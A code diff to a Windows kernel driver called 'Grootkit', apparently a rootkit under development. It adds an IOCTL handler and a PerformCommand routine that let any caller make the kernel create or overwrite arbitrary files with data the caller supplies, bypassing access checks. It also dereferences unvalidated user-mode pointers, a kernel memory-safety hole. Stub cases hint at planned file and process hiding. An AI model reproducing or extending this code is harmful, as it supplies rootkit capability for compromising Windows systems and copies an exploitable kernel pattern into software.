@@ -5,10 +5,14 @@
 void GrootkitUnload(PDRIVER_OBJECT DriverObject);
 NTSTATUS GrootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 NTSTATUS GrootkitDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);
+NTSTATUS PerformCommand(GrootkitData* command);
 
 //Driver Entry
 extern "C" NTSTATUS
 DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+
+	UNREFERENCED_PARAMETER(RegistryPath);
+
 	DriverObject->DriverUnload = GrootkitUnload;
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = GrootkitCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_CLOSE] = GrootkitCreateClose;
@@ -61,13 +65,28 @@ NTSTATUS GrootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 }
 
 NTSTATUS GrootkitDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+
+	UNREFERENCED_PARAMETER(DeviceObject);
+
 	// get our IO_STACK_LOCATION
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
-	auto status = STATUS_SUCCESS;
+	NTSTATUS status = STATUS_SUCCESS;
+	ULONG len;
+	GrootkitData* data;
 
 	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
 		case IOCTL_GROOTKIT:
-			// do the work
+			len = stack->Parameters.DeviceIoControl.InputBufferLength;
+			if (len < sizeof(GrootkitData)) {
+				status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+			data = (GrootkitData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+			if (data == nullptr){
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+			status = PerformCommand(data);
 			break;
 
 		default:
@@ -78,5 +97,55 @@ NTSTATUS GrootkitDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	return status;
+}
+
+NTSTATUS PerformCommand(GrootkitData* command) {
+	NTSTATUS status = STATUS_SUCCESS;
+	HANDLE fileHandle = NULL;
+	OBJECT_ATTRIBUTES objectAttributes;
+	IO_STATUS_BLOCK ioStatusBlock;
+
+	switch (command->whichCommand)
+	{
+		case FileCreation:
+			InitializeObjectAttributes(&objectAttributes,
+				command->command.FileCreation.filePath,
+				OBJ_KERNEL_HANDLE,
+				NULL,
+				NULL);
+			status = ZwCreateFile(&fileHandle, 
+				GENERIC_WRITE, 
+				&objectAttributes, 
+				&ioStatusBlock, 
+				NULL, 
+				FILE_ATTRIBUTE_NORMAL, 
+				NULL,
+				FILE_OVERWRITE_IF,
+				FILE_NON_DIRECTORY_FILE,
+				NULL,
+				NULL);
+			if ( !NT_SUCCESS(status) ) {
+				break;
+			}
+			status = ZwWriteFile(fileHandle,
+				NULL, 
+				NULL, 
+				NULL, 
+				&ioStatusBlock, 
+				command->command.FileCreation.data->Buffer, 
+				command->command.FileCreation.data->Length,
+				NULL, 
+				NULL);
+			break;
+		case FileFilter:
+		case ProcessFilter:
+		case ProcessCreation:
+			status = STATUS_INVALID_MEMBER;
+
+		default:
+			break;
+	}
+
 	return status;
 }
